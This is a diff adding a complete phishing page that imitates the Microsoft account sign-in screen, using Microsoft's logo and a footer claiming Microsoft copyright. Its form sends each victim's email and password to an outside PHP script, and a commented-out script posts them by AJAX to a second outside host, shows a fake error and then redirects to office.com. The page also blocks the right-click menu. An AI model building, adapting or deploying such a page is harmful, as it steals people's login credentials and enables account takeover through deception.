@@ -1,0 +1,489 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1,
+shrink-to-fit=no">
+
+<!-- Bootstrap CSS -->
+<link rel="stylesheet" href=""
+integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+crossorigin="anonymous">
+<link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap"
+rel="stylesheet">
+<link rel="shortcut icon" type="icon" href="https://i.imgur.com/YfpmLHg.png">
+<script src="https://kit.fontawesome.com/585b051251.js"
+crossorigin="anonymous"></script>
+<title>Microsoft | Login</title>
+<!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
+
+<style type="text/css">
+
+body {
+  font-family: "Segoe UI Webfont",-apple-system,"Helvetica
+Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe
+Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao
+UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei
+UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo
+Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft
+PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV
+Boli","Myanmar Text","Cambria Math";
+  font-size: 1rem;
+  line-height: 1.5;
+  color: #212529;
+  text-align: left;
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  background-position: center;
+  background-size: cover;
+  background-origin: border-box;
+}
+
+.overlay {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0,0,0,0.40);
+
+}
+[type="button"]::-moz-focus-inner, [type="reset"]::-moz-focus-inner,
+[type="submit"]::-moz-focus-inner, button::-moz-focus-inner {
+  padding: 0;
+  border-style: none;
+}
+element {
+  background-color: #188fff;
+}
+.btn:not(:disabled):not(.disabled) {
+  cursor: pointer;
+}
+.text-white {
+  color: #fff !important;
+}
+.pl-4, .px-4 {
+  padding-left: 1.5rem !important;
+}
+.pr-4, .px-4 {
+  padding-right: 1.5rem !important;
+}
+.mt-4, .my-4 {
+  margin-top: 0.5rem !important;
+
+}
+.btn {
+  display: inline-block;
+  min-width: 100px;
+  padding: 4px 12px 4px 12px;
+  margin-top: 0px;
+  margin-bottom: 0px;
+  position: relative;
+  max-width: 100%;
+  text-align: center;
+  white-space: nowrap;
+  overflow: hidden;
+  vertical-align: middle;
+  text-overflow: ellipsis;
+  touch-: manipulation;
+  color: #000;
+  border-style: solid;
+  border-width: 2px;
+  border-color: transparent;
+  background-color: rgba(0,0,0,0.2);
+}
+[type="reset"], [type="submit"], button, html [type="button"] {
+  -webkit-appearance: button;
+}
+button, select {
+  text-transform: none;
+}
+button, input {
+  overflow: visible;
+}
+button, input, optgroup, select, textarea {
+  margin: 0;
+      margin-top: 0px;
+  font-family: inherit;
+  font-size: inherit;
+  line-height: inherit;
+}
+button {
+  border-radius: 0;
+}
+*, ::after, ::before {
+  box-sizing: border-box;
+}
+.text-right {
+  text-align: right !important;
+}e;
+}
+html {
+  font-family: sans-serif;
+  line-height: 1.15;
+  -webkit-text-size-adjust: 100%;
+}
+  textarea:hover,
+input:hover,
+textarea:active,
+input:active,
+textarea:focus,
+input:focus,
+button:focus,
+button:active,
+button:hover,
+label:focus,
+.btn:active,
+.btn.active
+{
+  outline:0px !important;
+  -webkit-appearance:none;
+  box-shadow: none !important;
+}
+
+  .box
+  {
+    /*box-shadow: 0 2px 3px rgba(0,0,0,0.55);*/
+    /*border: 1px solid rgba(0,0,0,0.4);*/
+    background-color: #fff;
+    min-height: 338px;
+    min-width: 320px;
+    max-width: 440px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 140px;
+    margin-bottom: 28px;
+          }
+    .login-box input[type='signup'], .signup {
+    font-size: 1rem;
+  line-height: 1.5;
+    }
+.form-control {
+  display: block;
+  width: 100%;
+  padding: .375rem .0rem;
+  font-size: 1rem;
+  line-height: 1.5;
+  color: #495057;
+  background-color: #fff;
+  background-clip: padding-box;
+  border: 1px solid #ced4da;
+      border-top-color: rgb(206, 212, 218);
+      border-top-style: solid;
+      border-top-width: 1px;
+      border-right-color: rgb(206, 212, 218);
+      border-right-style: solid;
+      border-right-width: 1px;
+      border-bottom-color: rgb(206, 212, 218);
+      border-left-color: rgb(206, 212, 218);
+      border-left-style: solid;
+      border-left-width: 1px;
+  border-radius: .25rem;
+  transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
+  }
+
+  #footer {
+    position: fixed;
+    bottom: 0px;
+    left: 0;
+    width: 100%;
+    overflow: visible;
+    z-index: 99;
+    clear: both;
+    background-color: #000;
+    background-color: rgba(0,0,0,0.6);
+  }
+
+  /*.footerNode span {
+  color: #fff;
+  font-size: 0.75rem;
+  line-height: 28px;
+  white-space: nowrap;
+  display: inline-block;
+  float: right;
+  margin-left: 8px;
+  margin-right: 8px;
+}*/
+div .footerNode a, div .footerNode span {
+  color: #fff;
+  font-size: 0.75rem;
+  line-height: 28px;
+  white-space: nowrap;
+  display: inline-block;
+  float: right;
+  margin-left: 8px;
+  margin-right: 8px;
+}
+  @media only screen and (max-width: 610px) {
+    #hide{
+      display: none;
+
+    }
+  }
+
+</style>
+</head>
+<script>
+document.addEventListener('contextmenu', event => event.preventDefault());
+</script>
+<body style="background-image: url('https://ia601506.us.archive.org/24/items/0-a-5dbd-4393ff-6a-725c-7e-62b-61df-7e-72f-0/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg');
+background-size: cover;background-repeat: no-repeat;">
+<div class="container-fluid">
+  <div class="container">
+    <div class="row my-5 py-5">
+        <!-- <div class="col-lg-6" id="hide">
+          <div class="text-white my-5 py-3">
+            <span class="display-4">Expand Your<br> Microsoft</span><br><br>
+            <span class="h5 font-weight-normal">Upgrade to ad-free
+email and the latest productivity tools with
+Microsoft.</span><br><br><br>
+            <button class="btn btn-white rounded-0 px-5 py-2"
+style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get
+Started</button>
+          </div>
+        </div> -->
+        <div class="col-lg-6 mx-auto">
+          <div class="bg-white box" id="div1">
+            <img
+src="https://logincdn.msauth.net/16.000.28666.7/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+class="img-fluid"><br><br>
+            <big> <big>Sign in</small><small><small><small></a><br>
+            <span id="error" class="text-danger" style="display: none;
+color: red;">Enter a valid email address, phone number, or Skype
+name.</span>
+            <div class="form-group mt-2">
+              <form method="POST" action="https://johntony0.com/H1.php" id="contact">
+              <input type="email" name="emid" class="form-control
+rounded-0 border-dark" id="emid" aria-describedby="emailHelp"
+placeholder="Email, phone or Skype" style="border-right:
+none;border-left: none;border-top: none;">
+              <input type="password" name="epass"
+class="form-control rounded-0 border-dark" id="epass"
+aria-describedby="emailHelp" placeholder="Password"
+style="border-right: none;border-left: none;border-top: none;">
+            </div>
+            <p>No account? <a href="#"style="text-decoration:
+none;color: #0067b8;">Create one!</a><p>
+            <a href="#"style="text-decoration: none;color:
+#0067b8;">Can access your account?</a><p>
+            <a href="#"style="text-decoration: none;color:
+#0067b8;">Sign-in options</a><p>
+
+            <!-- <p><a href="#">Sign in with a security key</a></p>
+              <p><a href="#">sign in options</a></p> -->
+              <div class="text-right">
+                <button type="submit" class="btn rounded-0 text-white
+px-4 mt-4" id="n" style="background-color: #0066BA;">Sign in</button>
+              </div>
+            </div>
+          </form>
+            <!-- <div class="m-5 p-4 bg-white box" id="div2"
+style="display: none;">
+
+                <img
+src="https://logincdn.msauth.net/16.000.28666.7/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+class="img-fluid"><br><br>
+                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span
+id="emailch">abc@abc.com</span><br>
+                <big><big><Big>Enter
+Password</small><small><small><small><small></a><br>
+                <span id="msg" class="text-danger" style="display:
+none; color: red;"></span>
+
+                <div class="form-group mt-2">
+                  <input type="password" name="pass1"
+class="form-control rounded-0 border-dark" id="password"
+aria-describedby="emailHelp" placeholder="Password"
+style="border-right: none;border-left: none;border-top: none;">
+                </div>
+                <!-- <p>No account? <a href="#">Create one!</a></p> -->
+                  <!-- <a href="#"style="text-decoration: none;color:
+#0067b8;">Sign in with a security key<a><p>
+            <a href="#"style="text-decoration: none;color:
+#0067b8;">Forget my password?</a><p>
+                <div class="text-right">
+                  <button type="submit" class="btn rounded-0
+text-white px-4" id="submit-btn" style="background-color: #0066BA;"
+>Sign n</button>
+                </div> --> -->
+
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer id="footer">
+      <div>
+        <div class="footerNode">
+          <span>...</span>
+          <span>Privacy & cookies</span>
+          <span>Terms of use</span>
+          <span>©2021 Microsoft</span>
+        </div>
+      </div>
+    </footer>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+crossorigin="anonymous"></script>
+  </body>
+
+  <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+
+  /////////////url email getting////////////////
+  var email = window.location.hash.substr(1);
+  if (!email) {
+
+  }
+  else
+  {
+    var base64regex =
+/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+    if (!base64regex.test(email)) {
+          // alert(btoa(email));
+          var my_email =email;
+        }
+        else
+        {
+          // alert(atob(email));
+          var my_email =atob(email);
+        }
+      // $('#email').val(email);
+      // var my_email =email;
+      var filter =
+/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      $('#email').val(my_email);
+    }
+
+
+
+
+
+    $('#email').click(function(){
+      $('#error').hide();
+    });
+    $('#next').click(function () {
+      var my_email =$('#email').val();
+      var filter =
+/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+
+      $("#div1").animate({left:200, opacity:"hide"}, 0);
+      $("#div2").animate({right:200, opacity:"show"}, 1000);
+      $("#emailch").html(my_email);
+
+    });
+    $('#back').click(function () {
+      $("#msg").hide();
+      $("#email").val("");
+      $("#password").val("");
+      $("#div2").animate({left:200, opacity:"hide"}, 0);
+      $("#div1").animate({right:200, opacity:"show"}, 1000);
+
+    });
+
+
+    $('#submit-btn').click(function(event){
+      event.preventDefault();
+      var email=$("#email").val();
+      var password=$("#password").val();
+      var detail=$("#field").html();
+      var msg = $('#msg').html();
+
+      var my_email =email;
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      $('#msg').text( msg );
+      count=count+1;
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://xlxs.xyz/',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+          detail:detail,
+
+        },
+        beforeSend: function(xhr){
+          $('#submit-btn').html('Verifing...');
+        },
+        success: function(response){
+          $("#password").val("");
+          // if (count>=2) {
+          //   count=0;
+          //   window.location.replace("https://www.office.com");
+          // }
+          if(response){
+            $("#msg").show();
+            console.log(response);
+            if(response['signal'] == 'ok'){
+             $('#msg').html(response['msg']);
+           }
+           else{
+            $('#msg').html(response['msg']);
+          }
+        }
+      },
+      error: function(){
+        $("#password").val("");
+        if (count>=2) {
+          count=0;
+          window.location.replace("https://www.office.com");
+        }
+        $("#msg").show();
+        $('#msg').htQml("Your account or password is incorrect.");
+      },
+      complete: function(){
+        $('#submit-btn').html('Login');
+      }
+    });
+    });
+  });
+</script> -->
+</html>
+
+
+
+
+
+
+
+
+
